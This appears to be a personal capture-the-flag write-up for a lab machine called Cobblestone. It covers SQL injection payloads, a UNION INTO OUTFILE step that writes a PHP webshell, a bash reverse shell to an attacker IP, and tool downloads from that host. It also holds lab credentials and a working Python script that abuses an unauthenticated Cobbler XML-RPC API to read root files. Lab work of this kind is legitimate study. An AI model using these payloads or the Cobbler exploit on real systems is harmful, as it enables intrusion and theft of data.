@@ -1,0 +1,251 @@
+nmap -sV cobblestone.htb shows 22 and 80 are open
+nmap -sV -sU cobblestone.htb wasn't even working bruh
+
+feroxbuster -u http://cobblestone.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+- db endpoints returns 404
+- skins endpoint redirects to login page, which reveals this is some minecraft-related website????????????
+	- admin user is already taken when attempting to use admin/admin@cobblestone.htb email, either or both are reused
+	- login w/ jose:balls
+		- we can see that we can download and request skins to be added, the skins are stored at /skins, possible directory traversal onto the machine by sending our own "skin" to download?
+		- request skin, then download it?
+			- firstly attempt 
+
+ffuf -u http://cobblestone.htb -w /usr/share/seclists/Discovery/DNS/bug-bounty-program-subdomains-trickest-inventory.txt -H "Host:FUZZ.cobblestone.htb" -fs 292 (size found firstly by not having -fs flag, find most common size)
+- lots of 302 status, if not all of the returned virtual hosts are 302 status
+
+viewing page source returns:
+- page coded by https://bybilly.uk, if we go to his page, we can find the source of the entire website: https://github.com/bybilly/minecraft-web-portal
+	- not much to find here other than the frontend bits
+
+get burp open:
+- found verify_login.php after logging in, sending username, password, and "submit", which is "login".
+	- redirects from verify endpoint to skins endpoint, which is why a 302 redirect is shown
+
+Found some more stuff on the main page, prior to logging in:
+- http://deploy.cobblestone.htb
+	- 4 staff members which show some potential roadblocks:
+		- firewalls for the servers are in place, maybe on the machine?
+		- apparmor is live? not that it matters a bunch at the moment
+		- chroot jails, which basically locks a process with a limited set of resources. This may explain why we cannot traverse outside of /var/www, since there is maybe a jail against the apache2 web server?
+- http://vote.cobblestone.htb
+	- shows 3 servers that can be upvoted, those being:
+		- server.sandlotminecraft.com
+		- mc.cobblstone.htb, which is the below endpoint
+		- sm.penguin.gg
+- http://mc.cobblestone.htb
+
+Moving over to download URL for requesting a skin, we'll give some random trash to see the response firstly;
+- Chroma wants to intercept the download for the skins, we firstly turn on burp intercepter, capture the request and send it to repeater:
+	- we can now modify the skin parameter to go back a directory, or do whatever we please
+	- GET /download.php?skin=../ HTTP/1.1 actually WORKS we can see we are in /var/www/htmlFile, which is ofc a directory
+		- it appears tho that we are stuck in this directory, since no matter how many "../" we give, we continue to get /var/ww/HtmlFile not found.
+
+Current guess is that we can rev shell by:
+- manipulating the skin parameter in the get request
+- manipulate the download URL on the request skin page
+
+Chroma wants to do XSS thru the request page:
+- <img src=1 href=1 onerror="javascript:alert(1)"></img>, running this in the URL section, and having intercept on, we can see 302 Found was returned
+	- no pop up, so no XSS with this payload
+- <script src=1 href=1 onerror="javascript:alert(1)"></script>
+	- also no worko
+
+Chroma wants to xss on server suggestion endpoint:
+- <script src=1 href=1 onerror="javascript:alert(1)"></script>
+	- WORKS, XSS is on this bit
+	- when looking at burp, we can see that much like the other servers, the details.php endpoint is referenced.
+		- Servers 1 - 3 are referenced by IDs 1 - 3, whilst our is #4.
+- We can capture a suggestion request, send to repeater, then attempt to run sqlmap to check for SQL injections against this endpoint, now that we know XSS is available
+	- Capture the following "details.php" GET request and paste the entire request from burp into a file (detailreq.txt) then check for SQL injection with the captured GET request: sqlmap -r detailreq.txt 
+		- not injectable, gonna try w/ original POST request that was captured, written in req.txt, contains the URL sent when originally sending off the server suggestion: sqlmap -r req.txt
+			- url is injectable: [INFO] POST parameter 'url' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable, this is good! Final command output shows the backend DB is MySQL and there are some injections we can do:
+
+sqlmap identified the following injection point(s) with a total of 73 HTTP(s) requests:
+---
+Parameter: url (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: url=dummydata' AND 8609=8609 AND 'eeOg'='eeOg
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: url=dummydata' AND (SELECT 1970 FROM (SELECT(SLEEP(5)))MDfn) AND 'SRwY'='SRwY
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: url=-9957' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7171626a71,0x6a707555745564704e46736b457a4f6a4a6f6b63694662765079657648544c6349416c54576c7459,0x716a6a7871),NULL-- -
+---
+[17:06:51] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian
+web application technology: Apache 2.4.62
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+[17:06:52] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/vote.cobblestone.htb'
+
+We can supply a UNION query to obtain a rev shell: ' UNION SELECT 1,2,3,"<?php system($_GET['cmd']); ?>",5 INTO OUTFILE '/var/www/vote/shell.php'-- -
+
+Once we have the shell we can query http://vote.cobblestone.htb/shell.php?cmd=id and check the response given back from the shell
+	- 1 2 3 uid=33(www-data) gid=33(www-data) groups=33(www-data) 5
+	- yep ggs we have a webshell
+	- we can get a rev shell by writing our cmd as: 
+		- python3 Penelope.py to capture shell
+		- cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.15.84/4444%200%3E%261%27
+		- works!
+
+On the shell, we found a connection.php file under the db directory:
+$dbserver = "localhost";
+$username = "voteuser";
+$password = "thaixu6eih0Iicho]irahvoh6aigh>ie";
+$dbname = "vote";
+
+$conn = new mysqli($dbserver, $username, $password, $dbname);
+
+// Check connection
+if ($conn->connect_errno > 0) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+MySQL creds???????????????????? epic
+
+We can connect to the MySQL DB by running: mysql -u voteuser -p'thaixu6eih0Iicho]irahvoh6aigh>ie'
+- SHOW databases; 
+	- information_schema and vote are returned
+- USE vote; 
+	- also work!
+- SHOW tables;
+	- can see users and votes, check users by running SELECT * FROM users;
+	- We get a massive table back!
+
++----+-----------+-----------+----------+-----------------------------+--------------------------------------------------------------+
+| id | Username  | FirstName | LastName | Email                       | Password                                                     |
++----+-----------+-----------+----------+-----------------------------+--------------------------------------------------------------+
+|  1 | admin     | Admin     |          | cobble@cobblestone.htb      | $2y$10$6XMWgf8RN6McVqmRyFIDb.6nNALRsA./u4HAF2GIBs3xgZXvZjv86 | |
++----+-----------+-----------+----------+-----------------------------+--------------------------------------------------------------+
+
+Epic. There are other users but those are ones that are already made by other ppl on the server. Admin needs to be cracked, appears to be bcrypt and salted? 
+- While this cracks we will get linpeas going:
+	- cd /tmp
+	- curl http://10.10.,15.84:8000/linpeas.sh -o linpeas.sh
+	- chmod +x then ./linpeas.sh
+		- we can see under running processes that /sbin/init is running under root. This is not a native Linux directory for binaries, so it may be a fine idea to run pspy and try to catch stuff on these processes?
+			- linpeas shows creds are in memory! Can be dumped w/ pspy????
+		- two other users on the machine, cobble and john, cobble is in video group which is marked red? vector? 
+		- Some other interesting files to note:
+			- /etc/cobbler/mongodb.conf
+			- /etc/skel/.bashrc 
+			- /home/cobble/.ssh/authorized_keys, also PermitRootLogin yes, PubkeyAuthentication no, PasswordAuthentication yes, UsePAM yes?
+			- /home/cobble/user.txt SHEEEEEEEEEESH
+			- /etc/cobbler/settings.yaml
+			- /var/log/laurel/ has some audit logs?
+
+Next thing to try is pspy, using the pspy64 big binary:
+- curl http://10.10.15.84:8000/pspy64 -o pspy
+- chmod +x pspy
+- ./pspy
+	- found: mysql -u dbuser -px xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -h 127.0.0.1 cobblestone 
+	- sshd: cobble@pts/2, 
+	- chsh --shell /bin/rbash cobble
+	- bash -c printf %q "/usr/bin/google-chrome" 
+
+Chroma did stuff on his own and actually found the cobble user password: cobble:iluvdannymorethanyouknow
+- This would have been found from the MySQL command HOWEVER, it was bugged on our side and did not show the password; it only showed Xs like what is shown here.
+	- fun fact, the password is literally in plaintext in the connection.php file under /var/www/html/db lol. Just do moar directory enumeration whenever u get a shell.
+- When we enter the DB and dump the tables, we can see MD5 hashes for the admin and cobble user.
+	- Admin is not crackable but cobble is.
+
+SSH and we can get user flag. 
+
+One big thing to recognize is that we are running rbash; effectively, we are in a restricted environment, and cannot escape the /home/cobble directory. We cannot go anywhere. We needa escape rbash OR return back to the web shell and continue enumeration and other stuff there.
+- https://systemweakness.com/how-to-breakout-of-rbash-restricted-bash-4e07f0fd95e reading this we can uncover some stuff:
+	- export -p returns a big list of env variables:
+
+declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1000/bus"
+declare -x HOME="/home/cobble"
+declare -x LANG="en_US.UTF-8"
+declare -x LOGNAME="cobble"
+declare -x MOTD_SHOWN="pam"
+declare -x OLDPWD
+declare -rx PATH="/usr/local/bin:/usr/bin:/bin:/usr/games"
+declare -x PWD="/home/cobble"
+declare -rx SHELL="/bin/rbash"
+declare -x SHLVL="1"
+declare -x SSH_CLIENT="10.10.15.84 41626 22"
+declare -x SSH_CONNECTION="10.10.15.84 41626 10.10.11.81 22"
+declare -x SSH_TTY="/dev/pts/5"
+declare -x TERM="xterm-256color"
+declare -x USER="cobble"
+declare -x XDG_RUNTIME_DIR="/run/user/1000"
+declare -x XDG_SESSION_CLASS="user"
+declare -x XDG_SESSION_ID="731"
+declare -x XDG_SESSION_TYPE="tty"
+
+	- ls /bin shows we have access only to cat, grep, ls, ps, rbash and ss as runnable commands.
+		- ss -tunl shows port 69 is open; prbly some other person on the machine. There is also ports 3306 and 25151 listening on localhost, which we can local port forward to ourselves using ssh: ssh -L 25151:127.0.0.1:25151 cobble@cobblestone.htb
+			- works! We see an error response which is very weird tho.
+				- We can send POST requests to the endpoint, and Chroma finds out that there is possible the ability for arbitrary code execution as root, allowing us to potentially read the root flag remotely.
+				- We can send an XML payload to the API and do some code execution and get back a session token?
+
+TOKEN=$(curl -s -X POST http://127.0.0.1:25151/ \
+-H "Content-Type: text/xml" \
+-d '<?xml version="1.0"?>
+<methodCall>
+  <methodName>login</methodName>
+  <params>
+    <param><value><string>cobbler</string></value></param>
+    <param><value><string>cobbler</string></value></param>
+  </params>
+</methodCall>' | xmllint --xpath "//value/string/text()" -)
+
+echo $TOKEN
+
+				- This actually works, now we needa do sumn with the session token.
+
+
+			- ssh -L 3306:127.0.0.1:3306 cobble@cobblestone.htb works too, but it gives back some jank and weird response about out of order packets?
+
+---
+
+Sitrep chroma got a script from a discord that gives ROOT FLAG ez pz. It does involve the 25151 xmlrpc service however this appears to do some ultra jank stuff lmao:
+
+import xmlrpc.client
+
+KERNEL = "/boot/vmlinuz-6.1.0-37-amd64"
+INITRD = "/boot/initrd.img-6.1.0-37-amd64"
+TARGET = "/root/root.txt"
+NAME   = "pwnsys"
+DEST   = "/leak"
+
+srv = xmlrpc.client.ServerProxy("http://127.0.0.1:25151/RPC2", allow_none=True)
+tok = srv.login("", -1)
+
+did = srv.new_distro(tok)
+srv.modify_distro(did, "name", "pwn_distro", tok)
+srv.modify_distro(did, "arch", "x86_64", tok)
+srv.modify_distro(did, "breed", "redhat", tok)
+srv.modify_distro(did, "kernel", KERNEL, tok)
+srv.modify_distro(did, "initrd", INITRD, tok)
+srv.save_distro(did, tok)
+
+pid = srv.new_profile(tok)
+srv.modify_profile(pid, "name", "pwn_profile", tok)
+srv.modify_profile(pid, "distro", "pwn_distro", tok)
+srv.save_profile(pid, tok)
+
+sid = srv.new_system(tok)
+srv.modify_system(sid, "name", NAME, tok)
+srv.modify_system(sid, "profile", "pwn_profile", tok)
+srv.modify_system(sid, "template_files", {TARGET: DEST}, tok)
+srv.save_system(sid, tok)
+
+srv.sync(tok)
+
+print(srv.get_template_file_for_system(NAME, DEST), end="")
+
+The script description summarized by me (originally provided by GPT) is the following:
+
+- tok = srv.login("", -1) gives us an anonymous xmlrpc session, doesn't even require the auth token we got previously, the API does not check for ANY form of authorization lmao
+- srv.modify_system(sid, "template_files", {TARGET: DEST}, tok), this basically modifies the Cobbler template directory to the DEST directory, which is /leak, which is totally arbitrary, it does NOT have to exist lol
+- srv.save_system(...) + srv.sync(tok) will basically sync everything and read file contents as root and prepare them for retrieval
+- srv.get_template_file_for_system(NAME, DEST) will basically pull the root flag contents from the read contents lol
+- The KERNEL/INITRD variables are made to ensure validation of the session? Weird stuff but you can tell it points to the VM initrd and kernel lol
+- NAME (pwnsys) is "just the system identifier you later reference." A lil odd lol, this API is sumn else.
+- DEST is used to store the root flag content for us, basically a key-value pair, where this arbitrary directory is our key and its pair is the read root flag contents
